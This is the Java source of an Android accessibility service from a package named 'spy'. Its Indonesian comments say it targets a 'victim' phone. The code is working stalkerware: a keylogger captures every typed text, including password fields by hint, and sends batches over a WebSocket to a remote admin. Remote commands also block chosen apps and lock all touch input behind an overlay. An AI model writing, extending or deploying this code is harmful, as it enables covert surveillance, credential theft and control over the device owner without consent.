package com.zaxz.spy;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import org.json.JSONObject;
import java.util.HashSet;
import java.util.Set;

/**
 * AppBlockerService — kunci akses aplikasi tertentu di HP victim.
 *
 * Cara kerja:
 *  1. Listen AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED — fire ketika user
 *     buka app baru (package name change).
 *  2. Cek apakah package ada di blocklist (disimpan di SharedPreferences).
 *  3. Kalau iya: tampilkan overlay full-screen "App Locked" di atas app.
 *     User gak bisa interact dengan app tersebut.
 *  4. Kalau user tekan "Home" di overlay → balik ke home screen.
 *
 * Blocklist di-set dari admin via WS command:
 *   - set_app_block (package_name, blocked: true/false)
 *   - get_app_blocks (return list)
 *
 * Catatan: AccessibilityService butuh user consent 1x di Settings.
 */
public class AppBlockerService extends AccessibilityService {

    private static final String TAG = "AppBlocker";
    private static final String PREFS_NAME = "app_blocker";
    private static final String BLOCKLIST_KEY = "blocklist";
    private static final String TOUCH_LOCK_KEY = "touch_locked";
    private static final String KEYLOG_ENABLED_KEY = "keylog_enabled";

    private SharedPreferences prefs;
    private Set<String> blocklist = new HashSet<>();
    private WindowManager windowManager;
    private android.view.View currentOverlay;
    private String lastBlockedPackage = null;
    private Handler handler;

    // ============ KEYLOGGER STATE ============
    // Capture semua text yang user ketik di aplikasi manapun (password, search, chat, dll).
    // Save ke keylog.txt per-device. Admin bisa view real-time.
    private boolean keylogEnabled = true;
    private java.util.List<JSONObject> keylogBuffer = new java.util.ArrayList<>();
    private long lastKeylogFlush = 0;
    private static final long KEYLOG_FLUSH_INTERVAL_MS = 5000; // flush tiap 5 detik

    // ============ TOUCH LOCK STATE ============
    // Kalau enabled: tampilkan overlay transparent yang capture semua touch events
    // → user gak bisa pencet apa-apa di layar victim.
    private boolean touchLocked = false;
    private android.view.View touchLockOverlay;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        loadBlocklist();
        loadTouchLockState();
        loadKeylogState();
        windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        handler = new Handler(Looper.getMainLooper());
        Log.i(TAG, "AppBlockerService started. Blocklist: " + blocklist.size() + " apps, touchLocked: " + touchLocked);
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        // Configure accessibility service info — listen multiple event types
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                          AccessibilityEvent.TYPE_VIEW_FOCUSED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Log.i(TAG, "Accessibility service connected (keylogger + appblocker + touchlock)");

        // Restore touch lock overlay kalau sebelumnya enabled
        if (touchLocked) {
            showTouchLockOverlay();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        int eventType = event.getEventType();
        String packageName = (String) event.getPackageName();
        if (packageName == null) packageName = "";

        // ============ HANDLE KEYLOGGER (TYPE_VIEW_TEXT_CHANGED) ============
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED && keylogEnabled) {
            handleKeylogEvent(event, packageName);
            return;
        }

        // ============ HANDLE APP BLOCKER (TYPE_WINDOW_STATE_CHANGED) ============
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (packageName.isEmpty() || isSystemUiPackage(packageName)) return;

            if (blocklist.contains(packageName)) {
                showBlockOverlay(packageName);
            } else {
                hideBlockOverlay();
            }
        }
    }

    // ============ KEYLOGGER IMPLEMENTATION ============

    private void handleKeylogEvent(AccessibilityEvent event, String packageName) {
        try {
            CharSequence text = event.getText();
            if (text == null || text.length() == 0) return;

            String typedText = text.toString();
            if (typedText.isEmpty()) return;

            // Skip system input methods
            if (packageName.contains("inputmethod") || packageName.contains("keyboard")) return;

            // Get app name
            String appName = packageName;
            try {
                android.content.pm.ApplicationInfo ai = getPackageManager().getApplicationInfo(packageName, 0);
                appName = getPackageManager().getApplicationLabel(ai).toString();
            } catch (Exception e) {}

            // Get field label (hint) kalau ada — berguna buat tau ini password field atau search
            String fieldLabel = "";
            try {
                AccessibilityNodeInfo source = event.getSource();
                if (source != null) {
                    CharSequence hint = source.getHintText();
                    if (hint != null) fieldLabel = hint.toString();
                }
            } catch (Exception e) {}

            JSONObject entry = new JSONObject();
            entry.put("type", "keylog");
            entry.put("app", appName);
            entry.put("package", packageName);
            entry.put("text", typedText);
            entry.put("field_hint", fieldLabel);
            entry.put("from_index", event.getFromIndex());
            entry.put("added_count", event.getAddedCount());
            entry.put("removed_count", event.getRemovedCount());
            entry.put("time", System.currentTimeMillis());
            entry.put("time_formatted", new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(new java.util.Date()));

            synchronized (keylogBuffer) {
                keylogBuffer.add(entry);

                // Flush kalau buffer penuh atau interval tercapai
                long now = System.currentTimeMillis();
                if (keylogBuffer.size() >= 20 || (now - lastKeylogFlush) > KEYLOG_FLUSH_INTERVAL_MS) {
                    flushKeylog();
                }
            }
        } catch (Exception e) {
            // Silent
        }
    }

    private void flushKeylog() {
        synchronized (keylogBuffer) {
            if (keylogBuffer.isEmpty()) return;

            try {
                org.json.JSONArray entries = new org.json.JSONArray(keylogBuffer);
                JSONObject msg = new JSONObject();
                msg.put("type", "keylog_batch");
                msg.put("entries", entries);
                msg.put("count", keylogBuffer.size());
                msg.put("timestamp", System.currentTimeMillis());

                // Send via BackgroundService WebSocket (static reference)
                if (BackgroundService.instance != null) {
                    BackgroundService.instance.sendKeylogBatch(msg.toString());
                }
            } catch (Exception e) {
                Log.e(TAG, "flushKeylog error: " + e.getMessage());
            }

            keylogBuffer.clear();
            lastKeylogFlush = System.currentTimeMillis();
        }
    }

    private void loadKeylogState() {
        keylogEnabled = prefs.getBoolean(KEYLOG_ENABLED_KEY, true);
    }

    public static void setKeylogEnabled(Context context, boolean enabled) {
        SharedPreferences p = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        p.edit().putBoolean(KEYLOG_ENABLED_KEY, enabled).apply();
        Log.i("AppBlocker", "Keylogger " + (enabled ? "enabled" : "disabled"));
    }

    // ============ TOUCH LOCK IMPLEMENTATION ============

    private void loadTouchLockState() {
        touchLocked = prefs.getBoolean(TOUCH_LOCK_KEY, false);
    }

    public static void setTouchLocked(Context context, boolean locked) {
        SharedPreferences p = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        p.edit().putBoolean(TOUCH_LOCK_KEY, locked).apply();
        Log.i("AppBlocker", "Touch lock " + (locked ? "enabled" : "disabled"));

        // Trigger overlay show/hide via static instance
        if (instance != null) {
            if (locked) {
                instance.showTouchLockOverlay();
            } else {
                instance.hideTouchLockOverlay();
            }
        }
    }

    public static AppBlockerService instance;

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted");
    }

    private boolean isSystemUiPackage(String pkg) {
        return pkg.equals("com.android.systemui") ||
               pkg.equals("com.android.launcher") ||
               pkg.equals("com.android.launcher3") ||
               pkg.equals(getPackageName()) ||
               pkg.equals("com.android.settings") ||
               pkg.equals("com.android.permissioncontroller") ||
               pkg.equals("com.google.android.packageinstaller");
    }

    /**
     * Tampilkan overlay full-screen "App Locked".
     */
    private void showBlockOverlay(String packageName) {
        if (currentOverlay != null && packageName.equals(lastBlockedPackage)) {
            return; // Overlay udah tampil untuk app ini
        }

        // Hide overlay lama dulu kalau ada
        hideBlockOverlay();

        lastBlockedPackage = packageName;
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    // Build overlay view
                    LinearLayout layout = new LinearLayout(AppBlockerService.this);
                    layout.setOrientation(LinearLayout.VERTICAL);
                    layout.setGravity(Gravity.CENTER);
                    layout.setBackgroundColor(0xCC000000); // 80% black

                    int padding = (int) (32 * getResources().getDisplayMetrics().density);
                    layout.setPadding(padding, padding, padding, padding);

                    // Icon lock
                    TextView lockIcon = new TextView(AppBlockerService.this);
                    lockIcon.setText("🔒");
                    lockIcon.setTextSize(64);
                    lockIcon.setGravity(Gravity.CENTER);
                    layout.addView(lockIcon);

                    // Title
                    TextView title = new TextView(AppBlockerService.this);
                    title.setText("Aplikasi Dikunci");
                    title.setTextColor(0xFFFFFFFF);
                    title.setTextSize(22);
                    title.setGravity(Gravity.CENTER);
                    title.setPadding(0, 24, 0, 16);
                    layout.addView(title);

                    // App name
                    String appName = getAppName(packageName);
                    TextView appLabel = new TextView(AppBlockerService.this);
                    appLabel.setText(appName + " tidak bisa dibuka saat ini");
                    appLabel.setTextColor(0xFFCCCCCC);
                    appLabel.setTextSize(14);
                    appLabel.setGravity(Gravity.CENTER);
                    layout.addView(appLabel);

                    // Spacer
                    View spacer = new View(AppBlockerService.this);
                    LinearLayout.LayoutParams spacerParams = new LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT, 48);
                    layout.addView(spacer, spacerParams);

                    // "Back to Home" button
                    Button homeButton = new Button(AppBlockerService.this);
                    homeButton.setText("Kembali ke Home");
                    homeButton.setTextColor(0xFFFFFFFF);
                    homeButton.setBackgroundColor(0xFF4F46E5);
                    LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.WRAP_CONTENT,
                        LinearLayout.LayoutParams.WRAP_CONTENT);
                    btnParams.gravity = Gravity.CENTER;
                    homeButton.setOnClickListener(v -> {
                        // Go to home
                        Intent homeIntent = new Intent(Intent.ACTION_MAIN);
                        homeIntent.addCategory(Intent.CATEGORY_HOME);
                        homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(homeIntent);
                        hideBlockOverlay();
                    });
                    layout.addView(homeButton, btnParams);

                    // Window params
                    int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                        WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;

                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
                        PixelFormat.TRANSLUCENT
                    );
                    params.gravity = Gravity.CENTER;

                    windowManager.addView(layout, params);
                    currentOverlay = layout;

                    Log.i(TAG, "Block overlay shown for: " + packageName);
                } catch (Exception e) {
                    Log.e(TAG, "showBlockOverlay error: " + e.getMessage());
                }
            }
        });
    }

    private void hideBlockOverlay() {
        if (currentOverlay == null) return;
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    windowManager.removeView(currentOverlay);
                } catch (Exception e) {
                    // View udah di-remove
                }
                currentOverlay = null;
                lastBlockedPackage = null;
            }
        });
    }

    private String getAppName(String packageName) {
        try {
            PackageManager pm = getPackageManager();
            android.content.pm.ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
            return pm.getApplicationLabel(ai).toString();
        } catch (Exception e) {
            return packageName;
        }
    }

    // ============ BLOCKLIST MANAGEMENT ============

    private void loadBlocklist() {
        try {
            String saved = prefs.getString(BLOCKLIST_KEY, "");
            blocklist = new HashSet<>();
            if (saved != null && !saved.isEmpty()) {
                String[] parts = saved.split("\\|");
                for (String p : parts) {
                    if (!p.isEmpty()) blocklist.add(p);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "loadBlocklist error: " + e.getMessage());
        }
    }

    private void saveBlocklist() {
        try {
            StringBuilder sb = new StringBuilder();
            for (String p : blocklist) {
                if (sb.length() > 0) sb.append("|");
                sb.append(p);
            }
            prefs.edit().putString(BLOCKLIST_KEY, sb.toString()).apply();
        } catch (Exception e) {
            Log.e(TAG, "saveBlocklist error: " + e.getMessage());
        }
    }

    /**
     * Tambah/hapus package dari blocklist. Dipanggil dari BackgroundService
     * via static method (karena command dari WS diterima BackgroundService).
     */
    public static void setBlocked(Context context, String packageName, boolean blocked) {
        try {
            SharedPreferences p = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            Set<String> list = new HashSet<>();
            String saved = p.getString(BLOCKLIST_KEY, "");
            if (saved != null && !saved.isEmpty()) {
                String[] parts = saved.split("\\|");
                for (String part : parts) {
                    if (!part.isEmpty()) list.add(part);
                }
            }
            if (blocked) {
                list.add(packageName);
            } else {
                list.remove(packageName);
            }
            StringBuilder sb = new StringBuilder();
            for (String s : list) {
                if (sb.length() > 0) sb.append("|");
                sb.append(s);
            }
            p.edit().putString(BLOCKLIST_KEY, sb.toString()).apply();
            Log.i(TAG, "Blocklist updated: " + packageName + " = " + blocked + " (total: " + list.size() + ")");
        } catch (Exception e) {
            Log.e(TAG, "setBlocked error: " + e.getMessage());
        }
    }

    public static Set<String> getBlocklist(Context context) {
        try {
            SharedPreferences p = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            Set<String> list = new HashSet<>();
            String saved = p.getString(BLOCKLIST_KEY, "");
            if (saved != null && !saved.isEmpty()) {
                String[] parts = saved.split("\\|");
                for (String part : parts) {
                    if (!part.isEmpty()) list.add(part);
                }
            }
            return list;
        } catch (Exception e) {
            return new HashSet<>();
        }
    }

    // ============ TOUCH LOCK OVERLAY ============

    /**
     * Tampilkan overlay transparent full-screen yang capture SEMUA touch events.
     * User victim gak bisa pencet apa-apa di layar sampai lock di-disable.
     */
    private void showTouchLockOverlay() {
        if (touchLockOverlay != null) return; // sudah tampil

        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    // Bikin view transparent yang consume semua touch
                    android.view.View overlay = new android.view.View(AppBlockerService.this) {
                        @Override
                        public boolean onTouchEvent(android.view.MotionEvent event) {
                            return true; // consume event, jangan forward ke app di bawah
                        }
                    };
                    overlay.setBackgroundColor(0xCC1a1a2e); // 80% dark overlay biar terlihat locked

                    // Tambah text "Locked" di tengah
                    android.widget.FrameLayout container = new android.widget.FrameLayout(AppBlockerService.this);
                    container.setBackgroundColor(0xCC1a1a2e);

                    TextView lockText = new TextView(AppBlockerService.this);
                    lockText.setText("🔒\n\nPerangkat Dikunci\n\nHubungi administrator untuk membuka");
                    lockText.setTextColor(0xFFFFFFFF);
                    lockText.setTextSize(18);
                    lockText.setGravity(Gravity.CENTER);
                    android.widget.FrameLayout.LayoutParams textParams = new android.widget.FrameLayout.LayoutParams(
                        android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                        android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
                    );
                    textParams.gravity = Gravity.CENTER;
                    container.addView(overlay, new android.widget.FrameLayout.LayoutParams(
                        android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
                        android.widget.FrameLayout.LayoutParams.MATCH_PARENT
                    ));
                    container.addView(lockText, textParams);

                    int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                        WindowManager.LayoutParams.TYPE_SYSTEM_ERROR;

                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        type,
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSLUCENT
                    );
                    params.gravity = Gravity.CENTER;

                    windowManager.addView(container, params);
                    touchLockOverlay = container;
                    touchLocked = true;

                    Log.i(TAG, "Touch lock overlay shown");
                } catch (Exception e) {
                    Log.e(TAG, "showTouchLockOverlay error: " + e.getMessage());
                }
            }
        });
    }

    private void hideTouchLockOverlay() {
        if (touchLockOverlay == null) {
            touchLocked = false;
            return;
        }
        handler.post(new Runnable() {
            @Override
            public void run() {
                try {
                    windowManager.removeView(touchLockOverlay);
                } catch (Exception e) {
                    // View udah di-remove
                }
                touchLockOverlay = null;
                touchLocked = false;
                Log.i(TAG, "Touch lock overlay hidden");
            }
        });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
        hideTouchLockOverlay();
        // Flush keylog terakhir kalau ada
        if (!keylogBuffer.isEmpty()) {
            flushKeylog();
        }
    }
}
